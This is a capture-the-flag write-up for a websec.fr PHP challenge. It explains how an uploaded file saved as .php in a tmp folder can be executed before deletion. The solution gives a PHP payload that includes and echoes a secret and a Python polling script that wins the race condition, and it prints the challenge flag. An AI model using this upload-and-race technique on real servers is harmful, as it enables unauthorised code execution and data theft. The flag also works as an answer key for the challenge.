```PHP
<?php  
if(isset($_POST['submit'])) {  
    if ($_FILES['flag_file']['size'] > 4096) {  
        die('Your file is too heavy.');  
    }  
    $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';  
  
    $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');  
    $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));  
    @fclose($fp);  
  
    file_put_contents($filename, $flagfilecontent);  
    if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {  
        include($filename);  // it contains the `$flag` variable  
    } else {  
        $flag = "Nope, $filename is not the right file, sorry.";  
        sleep(1);  // Deter bruteforce  
    }  
  
    unlink($filename);  
}  
?>
```

### Directions
- Making the input filename `flag.php` will read the flag into the `filename` file.
	- PHP serves files - read the file after inputting
		- Writing php code and then making a get request to it will run it
			- include the flag and echo it
- How to bypass? `$_POST['checksum'] == crc32($_POST['checksum']`
	- ~~Hash collision~~ - (for now - this level should be easy)
	- `==` comparison is fucked
		- (Before PHP 8) Comparison of `int == string` will make the string 0 

# Solution
Input a `flag.php`:
```PHP
<?php
include("../flag.php");
echo $flag;
?>
```
And have a listener for the `/tmp/md5(IP).php` in the background:
```python
from time import sleep  
  
import requests  
  
def main():  
    file = "ba5f1b544962579c08d7f3d24d74c0f6.php"  
  
    while True:  
        response = requests.get(f"http://websec.fr/level28/tmp/{file}")  
        if response.status_code != 404:  
            print(response.text)  
        else:  
            print("...")  
        sleep(0.1)  
  
  
if __name__ == '__main__':  
    main()
```

Then submit the form with any checksum value and you'll see in the flag in the background listener:
```
WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}
```